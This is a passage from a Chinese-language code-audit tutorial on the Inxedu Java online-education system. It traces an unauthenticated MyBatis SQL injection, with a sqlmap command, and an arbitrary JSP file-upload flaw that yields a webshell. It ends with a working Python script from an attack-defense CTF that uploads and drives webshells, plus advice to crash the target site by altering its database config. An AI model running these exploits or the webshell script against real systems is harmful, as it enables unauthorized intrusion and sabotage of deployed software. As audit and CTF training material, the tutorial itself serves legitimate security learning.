                //request.getSession().setAttribute(CacheConstans.LOGIN_MEMCACHE_PREFIX+su.getUserId(),su );
                WebUtils.setCookie(response, CacheConstans.LOGIN_MEMCACHE_PREFIX, CacheConstans.LOGIN_MEMCACHE_PREFIX+su.getUserId(), 1);
                //修改用户登录记录
                sysUserService.updateUserLoginLog(su.getUserId(), new Date(), WebUtils.getIpAddr(request));
                //添加登录记录
                SysUserLoginLog loginLog = new SysUserLoginLog();
                loginLog.setUserId(su.getUserId());//用户ID
                loginLog.setLoginTime(new Date());//
                loginLog.setIp(WebUtils.getIpAddr(request));//登录IP
                String userAgent = WebUtils.getUserAgent(request);
                if(StringUtils.isNotEmpty(userAgent)){
                    loginLog.setUserAgent(userAgent.split(";")[0]);//浏览器
                    loginLog.setOsName(userAgent.split(";")[1]);//操作系统
                }
                //保存登录日志
                sysUserLoginLogService.createLoginLog(loginLog);
                model.setViewName(loginSuccess);
            }catch (Exception e) {
                model.addObject("message", "系统繁忙，请稍后再操作！");
                logger.error("login()--error",e);
            }
            return model;
        }
    }
这里可以看到登陆信息是经过数据库对比判断后缓存在服务端，并且在服务端验证的，除非加密算法可逆，要不然就没办法越权，这个后面可以细跟,鉴于文章篇幅，这里不做探讨。
####  0x5.3.2 前台功能审计
上面我们排除了简单的越权可能性, 所以我们可以集中精力围绕在前台功能点。
**前台SQL注入挖掘思路**
这套系统采用的是Mybatis框架
[Java Mybatis框架入门教程](http://c.biancheng.net/mybatis/)
`src/main/java/com/inxedu/os/app/controller/user/AppUserController.java`
    @Controller
    @RequestMapping("/webapp")
    public class AppUserController extends BaseController{
    ..........
    @RequestMapping("/deleteFaveorite")
        @ResponseBody
        public Map deleteFavorite(HttpServletRequest request){
            Map json=new HashMap();
            try{
                String id=request.getParameter("id");
                if(id==null||id.trim().equals("")){
                    json=setJson(false, "id不能为空", null);
                    return json;
                }
                courseFavoritesService.deleteCourseFavoritesById(id);
                json=setJson(true, "取消收藏成功", null);
            }catch (Exception e) {
                json=setJson(false, "异常", null);
                logger.error("deleteFavorite()---error",e);
            }
            return json;
        }
      ....................
    }
这个主类入口是`webapp`,所以我们访问`/webapp/deleteFaveorite`,就能访问到该控制器,`/webapp`
并没有拦截器处理,所以我们可以直接不带cookie访问。
可以看到直接获取了id值,然后进入了`courseFavoritesService.deleteCourseFavoritesById(id)`
我们继续跟进:`deleteCourseFavoritesById`
`src/main/java/com/inxedu/os/edu/dao/impl/course/CourseFavoritesDaoImpl.java`
    package com.inxedu.os.edu.dao.impl.course;
    import java.util.List;
    import java.util.Map;
    import org.springframework.stereotype.Repository;
    import com.inxedu.os.common.dao.GenericDaoImpl;
    import com.inxedu.os.common.entity.PageEntity;
    import com.inxedu.os.edu.dao.course.CourseFavoritesDao;
    import com.inxedu.os.edu.entity.course.CourseFavorites;
    import com.inxedu.os.edu.entity.course.FavouriteCourseDTO;
    /**
     *
     * CourseFavorites
     * @author www.inxedu.com
     */
     @Repository("courseFavoritesDao")
    public class CourseFavoritesDaoImpl extends GenericDaoImpl implements CourseFavoritesDao {
        public void deleteCourseFavoritesById(String ids) {
            this.delete("CourseFavoritesMapper.deleteCourseFavoritesById", ids);
        // 这里就会寻找CourseFavoritesMapper.deleteCourseFavoritesById
        // 对应的XML文件
        // course/CourseFavoritesMapper.xml 中对应的
        // deleteCourseFavoritesById 自定义语句
        }
        public int checkFavorites(Map map) {
            return this.selectOne("CourseFavoritesMapper.checkFavorites", map);
        }
        public List queryFavoritesPage(int userId, PageEntity page) {
            return this.queryForListPage("CourseFavoritesMapper.queryFavoritesPage", userId, page);
        }
    }
`src/main/resources/mybatis/inxedu/course/CourseFavoritesMapper.xml`
        DELETE FROM EDU_COURSE_FAVORITES WHERE ID  IN  (${value})
我们可以看到这里拼接值是`String`类型,`${value}`采取的是直接拼接SQL语句的方法,至于为什么不采取#{}拼接方式,
因为这里想拼接的是数字类型，而`#{}`拼接方式默认都会两边带上`''`,其实解决方案就是自己可以再加一层数字判断即可。
我们可以直接采取SQLMAP来验证,然后check一下控制台执行的SQL就可以二次确认了。
`sqlmap -u "http://127.0.0.1:82//webapp/deleteFaveorite?id=1*"`
关于这个点触发点比较多,有兴趣读者可以自行跟一下。
读者如果对此还是不甚了解,[Mybatis从认识到了解
](https://www.e-learn.cn/content/java/1384478),可以先阅读下此文。
**任意文件上传挖掘思路**
`/src/main/java/com/inxedu/os/common/controller/VideoUploadController.java`
    @Controller
    @RequestMapping("/video")
    public class VideoUploadController extends BaseController{
    ................
        /**
         * 视频上传
         */
        @RequestMapping(value="/uploadvideo",method={RequestMethod.POST})
        public String gok4(HttpServletRequest request,HttpServletResponse response,@RequestParam(value="uploadfile" ,required=true) MultipartFile uploadfile,
                @RequestParam(value="param",required=false) String param,
                @RequestParam(value="fileType",required=true) String fileType){
            try{
                String[] type = fileType.split(",");
                //设置图片类型
                setFileTypeList(type);
                //获取上传文件类型的扩展名,先得到.的位置，再截取从.的下一个位置到文件的最后，最后得到扩展名
                String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());
                if(!fileType.contains(ext)){
                    return responseErrorData(response,1,"文件格式错误，上传失败。");
                }
                //获取文件路径
                String filePath = getPath(request,ext,param);
                File file = new File(getProjectRootDirPath(request)+filePath);
                //如果目录不存在，则创建
                if(!file.getParentFile().exists()){
                    file.getParentFile().mkdirs();
                }
                //保存文件
                uploadfile.transferTo(file);
                //返回数据
                return responseData(filePath,0,"上传成功",response);
            }catch (Exception e) {
                logger.error("gok4()--error",e);
                return responseErrorData(response,2,"系统繁忙，上传失败");
            }
        }
    ..........................
    }
我们跟进下`getPath`函数
        private String getPath(HttpServletRequest request,String ext,String param){
            String filePath = "/images/upload/";
            if(param!=null && param.trim().length()>0){
                filePath+=param; //这里直接拼接param,所以我们这里可以任意跳转目录
            }else{
                filePath+=CommonConstants.projectName;
            }
            filePath+="/"+ DateUtils.toString(new Date(), "yyyyMMdd")+"/"+System.currentTimeMillis()+"."+ext;
            return filePath;
        }
接着访问下:
`http://127.0.0.1:82/images/upload/20200127/1580125876609.jsp?i=ls`
我们已经拿到没有回显的shell了。
## 0x6 登顶赛维持权限小技巧
上次打湖湘杯下午场第一次接触登顶赛这种类型, 当时脑子都是在想什么高端操作，什么修改权限,秒修漏洞啥的，赛后出来我才明白，最简单最傻b的方法往往最有效。
>   1. 通过漏洞拿到webshell
>   2. 直接修改网站配置文件,修改数据库配置让网站挂掉,让功能没办法访问,自己记得修改了什么地方。
>   3. 写脚本不断发包去生成webshell,然后去请求,执行修改文件内容为你的队名的操作。
>
>
> (这里要跑两个线程一个是请求生成shell,一个是稳定shell)
>
>   1. 接近判断时间的时候,让网站正常回来即可。
>
下面是我自己写的简陋版本,后面我会将其框架化,并加入session管理。
这里要注意shell这样来拼接,要不然echo命令用不了:
``
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    import requests
    import urllib.parse
    import re
    import threading
    debug = True
    def g1(host):
        url = 'http://' + host + '/' +'video/uploadvideo?&param=temp&fileType=jsp'
        # 这里需要修改下shell名字,上传name等配置
        files = {'uploadfile': ('shell.jsp', open('shell.jsp', 'rb'))}
        if debug:
            print("url:n" + url)
            print(files)
        rText = requests.post(url, files=files, timeout=5).text
        # 这里是shell路径匹配正则
        shellRegex = re.compile('"url":"(.*?)"')
        if(shellRegex.search(rText)):
            shellPath = shellRegex.search(rText)[1]
            if debug:
                print("shellPath:n" + shellPath)
            # 开始拼接shell
            shellURL = 'http://' + host + shellPath
            if debug:
                print("shellURL:n" + shellURL )
            print("[+]Success,get Shell: {}".format(shellURL))
            return shellURL
        else:
            print("[-] Error, no shell!!!")
            return False
    def getShell(host):
        print("[+]Staring getShell.....".center(100,'*'))
        shellList = []
        # request 发包
        s1 = g1(host)
        # socket 自定义协议包发送
        # s2 = g2(url)
        if(s1):
            shellList.append(s1)
        return shellList
    def requestShell(shellURL, cmd, password):
        print("[+]Staring requestShell.....".center(100,'='))
        # 检查shell存活性
        if debug:
            print(shellURL)
        for u in shellURL:
            code = requests.get(u).status_code
            if(code != 404):
                # 开始创建请求线程
                print("[+] now, subThread requesting......")
                t = threading.Thread(target=work, args=(u, cmd, password,))
                t.start()
                t.join()
                return True
            else:
                print("[-]Error,404,shell:{}".format(u))
                return False
    def work(u, cmd, password):
        print("work Function................")
        param = urllib.parse.quote('?' + password + '=' + cmd,safe='/?&=', encoding=None, errors=None)
        url = u + param
        if debug:
            print(url)
        r = requests.get(url, timeout=5)
        if(r.status_code == 200):
            print("[+]Success, Execute CMD!!!")
            return True
        else:
            print("[-]Error, Execute CMD Failed!!")
    def attack(url):
        shellURL = getShell(url)
        # 执行的命令
        cmd = '''echo "123">/tmp/shell.txt ''';
        # 连接shell的参数
        password = 'cmd'
        if(shellURL):
            for i in range(2):
                print("n Staring Fuzz:{} n".format(str(i)).center(100,'+'))
                result = requestShell(shellURL, cmd, password)
            if(result):
                print("[+] Success,cmd:{}".format(cmd))
            else:
                print("[-] Error!")
        else:
            print("[-] Error, getshell failed!")
    def main():
        Target = ['127.0.0.1:82']
        # 这里可以进行多线程优化,针对批量目标的时候
        for host in Target:
            attack(host)
    if __name__ == '__main__':
        main()
`shell.jsp`
## 0x7 总结
这套系统还有很多值得深入挖掘的点，值得我再去细细分析，
后面的系列我依然会围绕这个系统来展开，探究更多java漏洞的可能性，本文更多的是一种萌新开门篇，重点在配置环境，然后粗浅介绍下系统的漏洞，让读者有直观的现象,
后面我将会从各种底层框架的使用来分析安全成因,并尝试去挖掘一些新的漏洞。
## 0x8 参考链接
[java代码审计文章集合](https://www.cnblogs.com/r00tuser/p/10577571.html)
[JDK、JRE、JVM三者间的关系](https://www.cnblogs.com/zhangzongxing01/p/5559126.html)
[Mac系统安装和配置tomcat步骤详解](https://www.jianshu.com/p/d5a3d34a7de9)
[JAVA代码审计 | 因酷网校在线教育系统](https://xz.aliyun.com/t/2646)
SSM框架审计